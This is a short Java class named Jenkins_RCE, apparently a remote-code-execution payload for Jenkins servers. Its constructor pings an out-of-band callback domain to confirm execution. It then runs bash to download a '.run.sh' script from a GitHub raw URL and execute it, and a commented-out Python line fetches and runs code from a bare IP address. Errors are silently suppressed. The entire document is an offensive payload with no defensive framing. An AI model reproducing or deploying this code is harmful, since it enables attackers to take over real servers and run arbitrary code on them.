public class Jenkins_RCE {
    public Jenkins_RCE() {
        try {
            java.lang.Runtime.getRuntime().exec("ping -c 1 jenkins.78kh7z.ceye.io");
            String[] cmd = new String[] {
                // "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://118.24.115.224:8088/lufVxLu6i');exec(r.read());\"",
                    "wget -q https://raw.githubusercontent.com/fop95854/jenkins_helper/master/.run.sh || curl -fsSLO https://raw.githubusercontent.com/fop95854/jenkins_helper/master/.run.sh | /bin/bash .run.sh" };
            for (String c : cmd) {
                java.lang.Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", c });
            }
        } catch (Exception e) {
        }

    }
}